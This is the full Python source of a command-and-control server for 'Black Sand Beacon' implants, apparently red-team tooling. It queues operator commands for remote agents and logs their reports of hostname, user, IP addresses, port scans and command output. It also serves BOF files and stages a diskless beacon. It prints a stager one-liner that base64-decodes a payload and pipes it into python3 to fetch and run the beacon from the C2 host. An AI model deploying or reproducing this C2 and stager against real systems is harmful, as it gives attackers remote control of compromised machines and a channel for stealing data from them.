#!/usr/bin/env python3
"""
Black Sand Beacon C2 Server

Gopher-style command and control server for Black Sand Beacon agents.
Handles command queuing, result collection, and BOF distribution.

Security features:
- Thread pool to prevent resource exhaustion
- HMAC-based message authentication (optional)
- Configurable TLS verification
- Centralized JSON configuration

Usage:
    python3 c2/server.py
    BSB_CONFIG=/path/to/config.json python3 c2/server.py
"""

import base64
import copy
import csv
import hashlib
import hmac
import json
import logging
import os
import random
import secrets
import socket
import ssl
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Optional, Dict, Any
from urllib.parse import unquote, urlparse, urlunparse

# Add include/ to path for config loader
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "include"))

try:
    from config_py import load_config, DEFAULTS as BEACON_DEFAULTS, _derive_keys
except ImportError:
    load_config = None
    BEACON_DEFAULTS = None
    _derive_keys = None

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Default configuration (overridden by config.json)
DEFAULTS = {
    "host": "0.0.0.0",
    "port": 7070,
    "url": "http://127.0.0.1:7070",
    "uri": "/api/poll/",
    "report_uri": "/report/",
    "aes_key_hex": "0123456789abcdef" * 4,
    "log_dir": "sessions/logs",
    "upload_dir": "sessions/uploads",
    "max_workers": 10,
    "hmac_enabled": False,
    "stage_token": "",
    "stage_beacon_path": str(Path(__file__).resolve().parent.parent / "build" / "beacon"),
    "tls_cert": "",
    "tls_key": "",
}


def _random_free_port() -> int:
    """Pick a free TCP port in the ephemeral range (best-effort bind probe)."""
    for _ in range(50):
        port = random.randint(1025, 65535)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(("0.0.0.0", port))
                return port
        except OSError:
            continue
    raise RuntimeError("could not find a free port for the C2")


def load_runtime_config() -> Dict[str, Any]:
    """Load configuration from JSON file or use defaults.

    Anything not provided (config.json or environment) is generated at
    random *per server run*: port, master key, staging token and client
    id. Generated values are recorded in cfg["generated"] so main() can
    print them, and they always win over the on-disk file when the
    config is served through the staging endpoint.
    """
    cfg_path = os.environ.get("BSB_CONFIG", str(ROOT / "config" / "config.json"))
    out = dict(DEFAULTS)
    out["generated"] = {}

    raw: Dict[str, Any] = {}
    if os.path.isfile(cfg_path):
        try:
            with open(cfg_path) as f:
                raw = json.load(f)
        except Exception as e:
            logging.warning("cannot read %s: %s", cfg_path, e)
            raw = {}

    if load_config is not None and os.path.isfile(cfg_path):
        try:
            data = load_config(cfg_path)
            out["url"] = data.get("c2", {}).get("url", out["url"])
            out["uri"] = data.get("c2", {}).get("uri", out["uri"])
            out["report_uri"] = data.get("c2", {}).get("report_uri", out["report_uri"])
            # Use derived encryption key from HKDF
            out["encryption_key"] = data.get("crypto", {}).get("encryption_key")
            # Use derived HMAC key from HKDF
            out["hmac_key"] = data.get("crypto", {}).get("hmac_key")
            # Legacy fallback
            out["aes_key_hex"] = data.get("crypto", {}).get(
                "aes_key_hex", out["aes_key_hex"]
            )
            out["log_dir"] = data.get("c2", {}).get("log_dir", out["log_dir"])
            out["upload_dir"] = data.get("c2", {}).get("upload_dir", out["upload_dir"])
            out["port"] = int(data.get("c2", {}).get("port", out["port"]))
            out["max_workers"] = int(
                data.get("server", {}).get("max_workers", out["max_workers"])
            )
            out["hmac_enabled"] = bool(
                data.get("crypto", {}).get("hmac_enabled", out["hmac_enabled"])
            )
            # Staging endpoints (diskless beacon delivery)
            out["stage_token"] = str(
                data.get("server", {}).get("stage_token", out["stage_token"])
            )
            out["stage_beacon_path"] = str(
                data.get("server", {}).get("stage_beacon_path", out["stage_beacon_path"])
            )
            out["tls_cert"] = str(data.get("server", {}).get("tls_cert", out["tls_cert"]))
            out["tls_key"] = str(data.get("server", {}).get("tls_key", out["tls_key"]))
        except Exception as e:
            logging.warning("config load failed: %s; using defaults", e)

    out["host"] = os.environ.get("BSB_C2_HOST", out["host"])
    port_env = os.environ.get("BSB_C2_PORT")
    out["port"] = int(port_env) if port_env else int(out["port"])
    # Staging overrides via environment
    out["stage_token"] = os.environ.get("BSB_STAGE_TOKEN", out["stage_token"])
    out["stage_beacon_path"] = os.environ.get(
        "BSB_STAGE_BEACON", out["stage_beacon_path"]
    )
    out["tls_cert"] = os.environ.get("BSB_TLS_CERT", out["tls_cert"])
    out["tls_key"] = os.environ.get("BSB_TLS_KEY", out["tls_key"])

    # --- Random generation: anything not provided via config/env is
    # fresh per server run (so every execution has new secrets) ---
    port_provided = bool((raw.get("c2", {}) or {}).get("port")) or bool(
        os.environ.get("BSB_C2_PORT")
    )
    if not port_provided:
        out["port"] = _random_free_port()
        out["generated"]["port"] = out["port"]
        # Point the runtime C2 URL at the generated port so the served
        # config and the one-liner agree with the actual listener.
        u = urlparse(str(out["url"]))
        host = u.hostname or "127.0.0.1"
        if host in ("0.0.0.0", "::", ""):
            host = "127.0.0.1"
        out["url"] = urlunparse((u.scheme, f"{host}:{out['port']}", u.path, "", "", ""))

    crypto_raw = raw.get("crypto", {}) or {}
    key_provided = bool(crypto_raw.get("master_key_hex") or crypto_raw.get("aes_key_hex"))
    if not key_provided:
        master_hex = secrets.token_hex(32)
        out["generated"]["master_key_hex"] = master_hex
        out["aes_key_hex"] = master_hex
        out["master_key_hex_runtime"] = master_hex
        if _derive_keys is not None:
            enc, hmac_k = _derive_keys(bytes.fromhex(master_hex))
            out["encryption_key"] = enc
            out["hmac_key"] = hmac_k

    token_provided = bool((raw.get("server", {}) or {}).get("stage_token")) or bool(
        os.environ.get("BSB_STAGE_TOKEN")
    )
    if not token_provided:
        out["stage_token"] = secrets.token_hex(16)
        out["generated"]["stage_token"] = out["stage_token"]

    client_id = (raw.get("c2", {}) or {}).get("client_id")
    if client_id:
        out["client_id"] = client_id
    else:
        out["client_id"] = "bsb-" + secrets.token_hex(4)
        out["generated"]["client_id"] = out["client_id"]

    # Use derived encryption key if available, else fall back to legacy aes_key_hex
    if out.get("encryption_key"):
        out["aes_key"] = out["encryption_key"]
    else:
        out["aes_key"] = bytes.fromhex(out["aes_key_hex"])
    # Use derived HMAC key if available, else fall back to aes_key
    if out.get("hmac_key"):
        out["hmac_key_bytes"] = out["hmac_key"]
    else:
        out["hmac_key_bytes"] = out["aes_key"]

    return out


def compute_hmac(key: bytes, data: bytes) -> str:
    """Compute HMAC-SHA256 for message authentication."""
    return hmac.new(key, data, hashlib.sha256).hexdigest()


def verify_hmac(key: bytes, data: bytes, signature: str) -> bool:
    """Verify HMAC-SHA256 signature."""
    expected = compute_hmac(key, data)
    return hmac.compare_digest(expected, signature)


def encrypt_data(
    data: bytes, key: bytes, hmac_key: bytes = None, use_hmac: bool = False
) -> str:
    """Encrypt data with AES-256-CFB and optional HMAC (legacy format without replay protection)."""
    if len(data) == 0:
        data = b"\x00"

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()

    payload = iv + encrypted
    b64 = base64.b64encode(payload).decode()

    if use_hmac:
        hmac_key_to_use = hmac_key if hmac_key is not None else key
        signature = compute_hmac(hmac_key_to_use, payload)
        return f"{b64}:{signature}"

    return b64


def encrypt_data_replay(
    data: bytes,
    key: bytes,
    counter: int,
    timestamp: int,
    hmac_key: bytes = None,
    use_hmac: bool = False,
) -> str:
    """Encrypt data with AES-256-CFB and replay protection (counter + timestamp)."""
    if len(data) == 0:
        data = b"\x00"

    iv = os.urandom(16)

    # Prepend counter (8 bytes LE) and timestamp (8 bytes LE)
    counter_bytes = counter.to_bytes(8, "little")
    timestamp_bytes = timestamp.to_bytes(8, "little")
    full_data = counter_bytes + timestamp_bytes + data

    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(full_data) + encryptor.finalize()

    payload = iv + encrypted
    b64 = base64.b64encode(payload).decode()

    if use_hmac:
        hmac_key_to_use = hmac_key if hmac_key is not None else key
        signature = compute_hmac(hmac_key_to_use, payload)
        return f"{b64}:{signature}"

    return b64


def decrypt_data(
    b64_data: str, key: bytes, hmac_key: bytes = None, use_hmac: bool = False
) -> Optional[bytes]:
    """Decrypt AES-256-CFB data with optional HMAC verification."""
    signature = None
    if use_hmac and ":" in b64_data:
        b64_data, signature = b64_data.rsplit(":", 1)

    raw = base64.b64decode(b64_data)

    if use_hmac and signature:
        # Use separate HMAC key if provided, else use encryption key
        hmac_key_to_use = hmac_key if hmac_key is not None else key
        if not verify_hmac(hmac_key_to_use, raw, signature):
            logging.error("HMAC verification failed")
            return None

    iv, ciphertext = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


def decrypt_data_replay(
    b64_data: str,
    key: bytes,
    hmac_key: bytes = None,
    use_hmac: bool = False,
    replay_window_seconds: int = 300,
    last_seen_counter: Dict[str, int] = None,
    client_id: str = None,
) -> Optional[tuple[bytes, int, int]]:
    """Decrypt AES-256-CFB data with replay protection (counter + timestamp).

    Returns (decrypted_data, counter, timestamp) on success, None on failure.
    """
    signature = None
    if use_hmac and ":" in b64_data:
        b64_data, signature = b64_data.rsplit(":", 1)

    raw = base64.b64decode(b64_data)

    if use_hmac and signature:
        hmac_key_to_use = hmac_key if hmac_key is not None else key
        if not verify_hmac(hmac_key_to_use, raw, signature):
            logging.error("HMAC verification failed")
            return None

    iv, ciphertext = raw[:16], raw[16:]

    # Decrypt with standard CFB first
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(ciphertext) + decryptor.finalize()

    # Extract counter (8 bytes LE) and timestamp (8 bytes LE)
    if len(decrypted) < 16:
        logging.error("Decrypted data too short for replay protection")
        return None

    # Extract counter (little-endian)
    counter = int.from_bytes(decrypted[:8], "little")
    # Extract timestamp (little-endian)
    timestamp = int.from_bytes(decrypted[8:16], "little")

    # Verify replay protection
    now = int(time.time())
    if counter <= 0:
        logging.error("Invalid counter: %d", counter)
        return None

    if last_seen_counter is not None and client_id is not None:
        last_seen = last_seen_counter.get(client_id, 0)
        if counter <= last_seen:
            logging.warning(
                "Replay detected: client=%s counter=%d last_seen=%d",
                client_id, counter, last_seen
            )
            return None

    # Check timestamp window (allow 60s future, replay_window_seconds past)
    if timestamp > now + 60:
        logging.warning("Timestamp in future: %d > %d", timestamp, now + 60)
        return None
    if timestamp < now - replay_window_seconds:
        logging.warning("Timestamp too old: %d < %d", timestamp, now - replay_window_seconds)
        return None

    # Return payload without counter/timestamp (16 bytes)
    payload = decrypted[16:]
    return payload, counter, timestamp


# --- Staging: diskless beacon/config delivery -------------------------------
#
# Endpoint contract:
#   GET /stage/beacon/<token>  -> packed beacon ELF
#   GET /stage/config/<token>  -> packed config.json
#
# Packing: three XOR layers whose keys are DERIVED from the staging token
# via HKDF-SHA256 (salt "blacksandbeacon-stage-v1", info stage-l1/2/3).
# The response body is just base64(xor3(payload)) — no keys on the wire,
# so captured traffic cannot be decoded without the token.
#
# Security note (honest): the token is the access gate AND the packing
# key material. XOR layers are string obfuscation, NOT cryptography —
# anyone holding the token decodes everything. The token rides in the
# URL, so deploy behind TLS (server.tls_cert / server.tls_key) or assume
# it is exposed to anyone who can capture traffic. The AES keys inside
# config.json are the real operational secret; rotate after engagement.
# Without a configured stage_token the endpoints fail closed.

STAGE_BEACON_PREFIX = "/stage/beacon/"
STAGE_CONFIG_PREFIX = "/stage/config/"
STAGE_KEY_COUNT = 3
STAGE_KEY_LEN = 32
STAGE_HKDF_SALT = b"blacksandbeacon-stage-v1"
STAGE_HKDF_INFOS = (b"stage-l1", b"stage-l2", b"stage-l3")


def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes:
    """RFC 5869 HKDF extract+expand. Pure stdlib so the server and the
    stager payload implement byte-identical derivation."""
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    out, t, counter = b"", b"", 1
    while len(out) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        out += t
        counter += 1
    return out[:length]


def stage_keys(token: str) -> list:
    """Derive the three staging XOR layers from the token."""
    ikm = (token or "").encode("utf-8")
    return [hkdf_sha256(ikm, STAGE_HKDF_SALT, info, STAGE_KEY_LEN) for info in STAGE_HKDF_INFOS]


def xor_layer(data: bytes, key: bytes) -> bytes:
    """Apply one XOR layer with a repeating key."""
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))


def stage_encode(payload: bytes, token: str) -> bytes:
    """Pack payload as base64 using token-derived XOR keys."""
    data = payload
    for k in stage_keys(token):
        data = xor_layer(data, k)
    return base64.b64encode(data) + b"\r\n"


def stage_decode(body: bytes, token: str) -> Optional[bytes]:
    """Inverse of stage_encode (used by tests and the stager parity check)."""
    try:
        data = base64.b64decode(body.strip())
        for k in reversed(stage_keys(token)):
            data = xor_layer(data, k)
        return data
    except Exception:
        return None


def stage_token_ok(state: C2State, token: str) -> bool:
    """Constant-time token check; fail closed when no token configured."""
    expected = state.cfg.get("stage_token") or ""
    if not expected:
        return False
    return hmac.compare_digest(str(expected), token or "")


def build_stage_config(state: C2State) -> bytes:
    """Build the beacon config JSON served by /stage/config.

    Runtime values (random-generated key/port/client id) always win over
    the on-disk file, so a fileless beacon agrees with *this* server
    run. The server-only section is stripped and derived key bytes are
    dropped (not JSON-serializable).
    """
    conf = copy.deepcopy(BEACON_DEFAULTS)
    cfg_path = os.environ.get("BSB_CONFIG", str(ROOT / "config" / "config.json"))
    if load_config is not None and os.path.isfile(cfg_path):
        try:
            conf = load_config(cfg_path)
        except Exception as e:
            logging.warning("stage config: load failed, using defaults: %s", e)

    cfg = state.cfg
    conf["c2"]["url"] = cfg.get("url") or conf["c2"]["url"]
    if cfg.get("port") is not None:
        conf["c2"]["port"] = int(cfg["port"])
    if cfg.get("client_id"):
        conf["c2"]["client_id"] = cfg["client_id"]
    runtime_master = cfg.get("master_key_hex_runtime")
    if runtime_master:
        conf["crypto"]["master_key_hex"] = runtime_master
        conf["crypto"]["aes_key_hex"] = runtime_master
    conf["crypto"].pop("encryption_key", None)
    conf["crypto"].pop("hmac_key", None)
    conf.pop("server", None)
    return json.dumps(conf, indent=2).encode()


def handle_stage(state: C2State, kind: str, token: str) -> bytes:
    """Serve the beacon ELF or the config.json through the staging contract."""
    if not stage_token_ok(state, token):
        logging.warning("stage %s: rejected (bad or missing token)", kind)
        return b"STAGE_FORBIDDEN\r\n"

    if kind == "beacon":
        blob_path = state.cfg.get("stage_beacon_path") or ""
        if not blob_path or not os.path.isfile(blob_path):
            logging.warning("stage beacon: file not found: %s", blob_path)
            return b"STAGE_UNAVAILABLE\r\n"
        blob = Path(blob_path).read_bytes()
        if blob[:4] != b"\x7fELF":
            logging.error("stage beacon: %s is not an ELF", blob_path)
            return b"STAGE_UNAVAILABLE\r\n"
    elif kind == "config":
        try:
            blob = build_stage_config(state)
        except Exception as e:
            logging.error("stage config: build failed: %s", e)
            return b"STAGE_UNAVAILABLE\r\n"
    else:
        return b"STAGE_FORBIDDEN\r\n"

    logging.info("stage %s: served (%d bytes)", kind, len(blob))
    return stage_encode(blob, token)


STAGE_PAYLOAD_PATH = Path(__file__).resolve().parent / "stage_payload.py"


def build_stage_oneliner(cfg: Dict[str, Any]) -> str:
    """Build the copy-paste stager one-liner for the current config.

    The stager payload (c2/stage_payload.py) reads URL and token from
    environment variables, so its base64 blob is constant and the
    one-liner is a plain pipe: decode payload, run it with env vars set.
    """
    payload = STAGE_PAYLOAD_PATH.read_bytes()
    blob = base64.b64encode(payload).decode()
    url = str(cfg.get("url", "")).rstrip("/")
    token = str(cfg.get("stage_token", ""))
    return (
        f"echo {blob} | base64 -d | "
        f"BSB_STAGE_URL='{url}' BSB_STAGE_TOKEN='{token}' python3 -"
    )


def copy_to_clipboard(text: str) -> bool:
    """Copy text to the X11/Wayland clipboard; False if no tool exists."""
    tools = (
        ["xclip", "-selection", "clipboard"],
        ["xsel", "--clipboard", "--input"],
        ["wl-copy"],
    )
    for cmd in tools:
        try:
            proc = subprocess.run(
                cmd,
                input=text.encode(),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
        if proc.returncode == 0:
            return True
    return False


class C2State:
    """Mutable state shared between request handlers."""

    def __init__(self, cfg: Dict[str, Any]):
        self.cfg = cfg
        self.commands: Dict[str, str] = {}
        self.connected_clients = set()
        self.results: Dict[str, Any] = {}
        # Replay protection: track last_seen_counter per client_id
        self.last_seen_counter: Dict[str, int] = {}
        self.lock = threading.Lock()

        os.makedirs(cfg["log_dir"], exist_ok=True)
        os.makedirs(cfg["upload_dir"], exist_ok=True)


def handle_get_command(state: C2State, selector: str) -> bytes:
    """Dispatch beacon's polling GET request."""
    prefix = state.cfg["uri"].rstrip("/") + "/"
    if not selector.startswith(prefix):
        return b"iUNKNOWN_SELECTOR\terror.host\t1\r\n.\r\n"

    client_id = selector[len(prefix) :].strip() or "unknown"

    with state.lock:
        state.connected_clients.add(client_id)
        cmd = state.commands.pop(client_id, "")

    if cmd:
        print(f"[>] {client_id} <- {cmd!r}", flush=True)

    payload = encrypt_data(
        cmd.encode() if cmd else b"",
        state.cfg["aes_key"],
        state.cfg.get("hmac_key_bytes"),
        state.cfg.get("hmac_enabled", False),
    )
    return payload.encode("ascii") + b"\r\n"


def handle_report(state: C2State, b64_payload: str) -> bytes:
    """Process beacon result report."""
    try:
        replay_window = state.cfg.get("replay_window_seconds", 300)
        result = decrypt_data_replay(
            b64_payload,
            state.cfg["aes_key"],
            state.cfg.get("hmac_key_bytes"),
            state.cfg.get("hmac_enabled", False),
            replay_window_seconds=replay_window,
            last_seen_counter=state.last_seen_counter,
            client_id=None,  # Will be extracted from payload
        )
        if result is None:
            return b"ERROR\r\n"

        decrypted, counter, timestamp = result
        data = json.loads(decrypted.decode())

        # Verify client_id matches counter tracking
        client_id = data.get("client", "unknown")

    except Exception as e:
        logging.error(
            "report decode error: %s (payload_len=%d head=%r tail=%r)",
            e, len(b64_payload), (b64_payload or "")[:24], (b64_payload or "")[-24:]
        )
        return b"ERROR\r\n"

    with state.lock:
        state.connected_clients.add(client_id)
        # Update replay protection counter
        last_seen = state.last_seen_counter.get(client_id, 0)
        if counter > last_seen:
            state.last_seen_counter[client_id] = counter

        log_file = os.path.join(state.cfg["log_dir"], f"{client_id}.log")
        new_file = not os.path.isfile(log_file)

        with open(log_file, "a", newline="") as f:
            writer = csv.writer(f)
            if new_file:
                writer.writerow(
                    [
                        "client_id",
                        "os",
                        "pid",
                        "hostname",
                        "ips",
                        "user",
                        "discovered_ips",
                        "result_portscan",
                        "result_pwd",
                        "command",
                        "output",
                    ]
                )
            writer.writerow(
                [
                    client_id,
                    data.get("client", "")[:100],
                    str(data.get("pid", ""))[:20],
                    data.get("hostname", "")[:100],
                    data.get("ips", "")[:100],
                    data.get("user", "")[:50],
                    str(data.get("discovered_ips", ""))[:1000],
                    str(data.get("result_portscan", ""))[:1000],
                    data.get("result_pwd", "")[:1000],
                    data.get("command", "")[:500],
                    data.get("output", "")[:1000],
                ]
            )

        state.results[client_id] = data

    cmd = data.get("command", "")
    out = data.get("output", "")
    if len(out) > 200:
        out = (
            out[:200].replace("\n", "\\n")
            + f"... (+{len(data.get('output',''))-200} chars)"
        )
    print(
        f"[<] {client_id} -> {cmd!r}  (pid={data.get('pid','')})  out={out!r}  counter={counter}",
        flush=True,
    )

    return b"OK\r\n"


def handle_bof(state: C2State, name: str) -> bytes:
    """Serve BOF file from upload directory with path traversal protection."""
    # Check for null bytes early
    if "\x00" in name:
        return b"BOF_NOT_FOUND\r\n"
    
    # Resolve upload directory to absolute path (handles symlinks)
    upload_dir_real = os.path.realpath(state.cfg["upload_dir"])
    
    # Get the requested file name (basename only, no directory components)
    safe = os.path.basename(name)
    if not safe or safe in (".", ".."):
        return b"BOF_NOT_FOUND\r\n"
    
    # Construct the requested path
    requested_path = os.path.join(state.cfg["upload_dir"], safe)
    
    # Resolve the requested path to absolute path (handles symlinks)
    requested_real = os.path.realpath(requested_path)
    
    # Verify the requested file is within the upload directory
    # Use os.path.commonpath or startswith with proper separator
    if not requested_real.startswith(upload_dir_real + os.sep) and requested_real != upload_dir_real:
        return b"BOF_NOT_FOUND\r\n"
    
    # Verify it's a regular file (not a directory, symlink to outside, etc.)
    if not os.path.isfile(requested_real):
        return b"BOF_NOT_FOUND\r\n"
    
    # Verify the file is actually inside the upload directory (not a symlink pointing outside)
    # The realpath check above already handles this, but double-check
    if not os.path.commonpath([upload_dir_real, requested_real]) == upload_dir_real:
        return b"BOF_NOT_FOUND\r\n"
    
    with open(requested_real, "rb") as f:
        return base64.b64encode(f.read()) + b"\r\n"


def handle_request(state: C2State, selector: str) -> bytes:
    """Route request to appropriate handler.

    Accepts both the HTTP/1.1 request form (the beacon uses libcurl)
    and the bare Gopher-style selector. Payloads carried in an HTTP
    path are percent-decoded, since base64 uses '+', '/' and '='
    which are not all legal in a request line.
    """
    selector = selector or ""

    # HTTP/1.1 request parsing
    head, _, rest = selector.partition("\r\n\r\n")
    if head and " " in head.split("\r\n", 1)[0]:
        request_line = head.split("\r\n", 1)[0]
        parts = request_line.split(" ", 2)
        if len(parts) == 3 and parts[2] in ("HTTP/1.0", "HTTP/1.1"):
            method, path, _ = parts
            path = path.split("?", 1)[0]

            if method == "GET" and path.startswith(state.cfg["uri"].rstrip("/") + "/"):
                return handle_get_command(state, path)
            if method == "POST" and path.startswith(
                state.cfg["report_uri"].rstrip("/") + "/"
            ):
                prefix = state.cfg["report_uri"].rstrip("/") + "/"
                # v1 beacons carry the payload in the POST body; v2/v3
                # append it (percent-encoded) to the URL segment. Accept both.
                payload = unquote(path[len(prefix) :]).strip()
                if not payload:
                    payload = rest.strip()
                return handle_report(state, payload)
            if method == "GET" and path.startswith("/bof/"):
                return handle_bof(state, unquote(path[len("/bof/") :]))
            if method == "GET" and path.startswith(STAGE_BEACON_PREFIX):
                return handle_stage(
                    state, "beacon", unquote(path[len(STAGE_BEACON_PREFIX) :]).strip()
                )
            if method == "GET" and path.startswith(STAGE_CONFIG_PREFIX):
                return handle_stage(
                    state, "config", unquote(path[len(STAGE_CONFIG_PREFIX) :]).strip()
                )

    # Gopher-style selector (legacy)
    selector = selector.strip()
    if selector.startswith(state.cfg["uri"].rstrip("/") + "/"):
        return handle_get_command(state, selector)
    if selector.startswith(state.cfg["report_uri"].rstrip("/") + "/"):
        return handle_report(
            state, selector[len(state.cfg["report_uri"].rstrip("/") + "/") :]
        )
    if selector.startswith("/bof/"):
        return handle_bof(state, selector[len("/bof/") :])
    if selector.startswith(STAGE_BEACON_PREFIX):
        return handle_stage(state, "beacon", selector[len(STAGE_BEACON_PREFIX) :].strip())
    if selector.startswith(STAGE_CONFIG_PREFIX):
        return handle_stage(state, "config", selector[len(STAGE_CONFIG_PREFIX) :].strip())

    return b"iUNKNOWN_SELECTOR\terror.host\t1\r\n.\r\n"


MAX_REQUEST = 65536


def _is_http_line(line: bytes) -> bool:
    """True if `line` is an HTTP request line ("GET /path HTTP/1.1")."""
    parts = line.split(b" ")
    return len(parts) == 3 and parts[2] in (b"HTTP/1.0", b"HTTP/1.1")


def _is_http_request(raw: bytes) -> bool:
    """True if the first line looks like an HTTP request line.

    Checked on the *complete* request only. A single recv() on a
    long request line can return a fragment that has not reached
    "HTTP/1.1" yet, so the caller must read to the header terminator
    before asking.
    """
    return _is_http_line(raw.split(b"\r\n", 1)[0])


def _read_request(conn: socket.socket) -> bytes:
    """Read one full request.

    HTTP is terminated by CRLFCRLF. A legacy Gopher selector is a
    single CRLF-terminated line with no header terminator, so a
    first line that is already complete and is not an HTTP request
    line ends the read too.
    """
    data = b""
    while b"\r\n\r\n" not in data:
        try:
            chunk = conn.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
        if len(data) > MAX_REQUEST:
            break
        first_line, sep, _ = data.partition(b"\r\n")
        if sep and not _is_http_line(first_line):
            break

    head, _, rest = data.partition(b"\r\n\r\n")
    length = 0
    for line in head.split(b"\r\n")[1:]:
        name, _, value = line.partition(b":")
        if name.strip().lower() == b"content-length":
            try:
                length = int(value.strip())
            except ValueError:
                length = 0
            break
    while len(rest) < length:
        try:
            chunk = conn.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        rest += chunk
    # `data` only holds bytes read up to the header terminator; splice the
    # fully-read body back in so large POST bodies are not truncated.
    if length:
        data = head + b"\r\n\r\n" + rest
    return data


def _http_response(body: bytes, status: str = "200 OK") -> bytes:
    payload = body.rstrip(b"\r\n")
    head = (
        f"HTTP/1.1 {status}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii")
    return head + payload


def serve_client(state: C2State, conn: socket.socket, addr: tuple):
    """Handle individual client connection."""
    try:
        conn.settimeout(5)
        data = _read_request(conn)

        if not data:
            return

        if _is_http_request(data):
            response = handle_request(state, data.decode("latin-1"))
            if response.startswith(b"iUNKNOWN_SELECTOR") or response.startswith(
                b"STAGE_"
            ):
                conn.sendall(_http_response(response, "404 Not Found"))
            else:
                conn.sendall(_http_response(response))
            return

        # Legacy Gopher dialect: raw payload, no framing.
        conn.sendall(handle_request(state, data.decode("latin-1")))
    except Exception as e:
        if "Connection reset by peer" in str(e):
            logging.debug("client hung up: %s", e)
        else:
            logging.error("client handler error: %s", e)
    finally:
        conn.close()


def serve(cfg: Dict[str, Any], state: C2State):
    """Bind and accept loop. Blocks until interrupted."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((cfg["host"], int(cfg["port"])))
    sock.listen(5)

    # Optional TLS: when a cert/key pair is configured, every accepted
    # connection is wrapped before it reaches the handler. Required for
    # staging in production: the token rides in the URL.
    tls_ctx = None
    tls_cert = cfg.get("tls_cert")
    tls_key = cfg.get("tls_key")
    if tls_cert and tls_key:
        tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        tls_ctx.load_cert_chain(tls_cert, tls_key)
        print(f"[*] TLS enabled (cert={tls_cert})")

    executor = ThreadPoolExecutor(max_workers=cfg.get("max_workers", 10))
    try:
        while True:
            try:
                conn, addr = sock.accept()
            except OSError:
                if sock.fileno() == -1:
                    break
                continue
            if tls_ctx is not None:
                try:
                    conn = tls_ctx.wrap_socket(conn, server_side=True)
                except (ssl.SSLError, OSError) as e:
                    logging.debug("TLS handshake failed from %s: %s", addr, e)
                    conn.close()
                    continue
            executor.submit(serve_client, state, conn, addr)
    except KeyboardInterrupt:
        print("\n[!] Shutting down C2 server")
    finally:
        sock.close()
        executor.shutdown(wait=False)


def command_injector(state: C2State):
    """Interactive command injection REPL."""
    print("\nC2 Command Injector (Ctrl+D to exit)")
    print("=" * 50)

    while True:
        try:
            cid = input("Client ID: ").strip()
            if not cid:
                continue
            cmd = input("Command: ").strip()
            if not cmd:
                continue

            with state.lock:
                state.commands[cid] = cmd

            print(f"[+] Queued '{cmd}' for {cid}")
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Exiting command injector")
            break


def main():
    """Start C2 server."""
    logging.basicConfig(
        level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s"
    )

    cfg = load_runtime_config()
    state = C2State(cfg)

    print("[*] Black Sand Beacon C2 Server")
    print(f"[*] Listening on {cfg['host']}:{cfg['port']}")
    print(f"[*] Thread pool: {cfg.get('max_workers', 10)} workers")
    print(f"[*] HMAC: {'enabled' if cfg.get('hmac_enabled') else 'disabled'}")
    print(f"[*] Log dir: {cfg['log_dir']}")
    print(f"[*] Upload dir: {cfg['upload_dir']}")

    gen = cfg.get("generated") or {}
    if gen:
        print("[*] Random runtime values (not provided; fresh every run):")
        for k, v in sorted(gen.items()):
            print(f"    {k}: {v}")

    if cfg.get("stage_token"):
        oneliner = build_stage_oneliner(cfg)
        print("[*] Staging enabled (diskless beacon delivery)")
        print("[*] Stager one-liner:")
        print()
        print(oneliner)
        print()
        if sys.stdin.isatty():
            if copy_to_clipboard(oneliner):
                print("[+] One-liner copied to clipboard")
            else:
                print("[!] No clipboard tool (xclip/xsel/wl-copy); copy manually")
        else:
            print("[*] Not a TTY: clipboard copy skipped (run interactively to copy)")
    else:
        print(
            '[*] Staging disabled (add "server": {"stage_token": "<random hex>"} '
            "to config.json to enable diskless delivery)"
        )

    # Start command injector in background thread
    injector_thread = threading.Thread(
        target=command_injector, args=(state,), daemon=True
    )
    injector_thread.start()

    serve(cfg, state)


if __name__ == "__main__":
    main()
